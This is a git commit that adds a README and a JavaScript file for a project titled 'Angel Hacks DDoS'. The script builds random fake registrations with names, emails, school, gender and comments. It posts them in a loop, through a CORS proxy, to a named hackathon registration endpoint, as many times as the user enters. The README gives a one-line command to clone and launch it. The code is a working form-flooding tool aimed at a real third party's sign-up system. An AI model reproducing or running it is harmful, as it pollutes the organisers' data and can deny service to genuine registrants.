5d975731fba3a854c3686297ae985698adff2bd9
Ken Mueller <kenmueller0@gmail.com>
2019-07-29 15:21:20 -0700

    Initial commit

---
+++ README.md
@@ -0,0 +1,9 @@
+# **Angel Hacks DDoS**
+
+## **Download and run**
+
+**Copy and paste this into a terminal (macOS)**
+
+```bash
+cd ~/Downloads && git clone https://github.com/kenmueller/angel-hacks-ddos.git && open -a 'Google Chrome' ~/Downloads/angel-hacks-ddos/index.html
+```
---
+++ index.js
@@ -0,0 +1,45 @@
+const EMAIL_PREFIX_LENGTH = 10
+const NAME_LENGTH = 10
+const COMMENT_LENGTH = 100
+const ALPHABET = 'abcdefghijklmnopqrstuvwxyz'
+const CHARACTERS = `${ALPHABET}1234567890`
+
+let spamCount
+
+const randomEmail = () =>
+	`${Array(EMAIL_PREFIX_LENGTH).fill(0).map(() => CHARACTERS[~~(Math.random() * CHARACTERS.length)]).join('')}@gmail.com`
+
+const randomName = () =>
+	Array(NAME_LENGTH).fill(0).map(() => ALPHABET[~~(Math.random() * ALPHABET.length)]).join('')
+
+const randomComment = () =>
+	Array(COMMENT_LENGTH).fill(0).map(() => ALPHABET[~~(Math.random() * ALPHABET.length)]).join('')
+
+const randomGender = () =>
+	`${Math.random() < 0.5 ? '' : 'fe'}male`
+
+const updateProgress = progress =>
+	document.querySelectorAll('.spam-progress').forEach(element => element.innerHTML = `<b>${progress}</b> / <b>${spamCount}${progress === spamCount ? '<br><br>Done!' : ''}</b>`)
+
+const updateMessage = message =>
+	document.querySelectorAll('.spam-message').forEach(element => element.innerHTML = message ? `<br>First name: <b>${message['First-Name']}</b><br>Last name: <b>${message['Last-Name']}</b><br>Email: <b>${message['email']}</b><br>School: <b>${message['School']}</b><br>Gender: <b>${message['Gender']}</b><br>Comment: ${message['other']}` : '')
+
+const spam = count => {
+	updateProgress(spamCount - count)
+	if (count <= 0) return updateMessage(undefined)
+	const message = {
+		'First-Name': randomName(),
+		'Last-Name': randomEmail(),
+		'School': randomName(),
+		'Gender': randomGender(),
+		'other': randomComment(),
+		'email': randomEmail()
+	}
+	updateMessage(message)
+	$.post('https://cors-anywhere.herokuapp.com/https://AngelHacks-Reg--hacker22.repl.co/addperson', message, () => spam(count - 1))
+}
+
+document.querySelectorAll('.spam-button').forEach(element => element.addEventListener('click', () => {
+	spamCount = parseInt(document.querySelector('.spam-count').value || 1)
+	spam(spamCount)
+}))
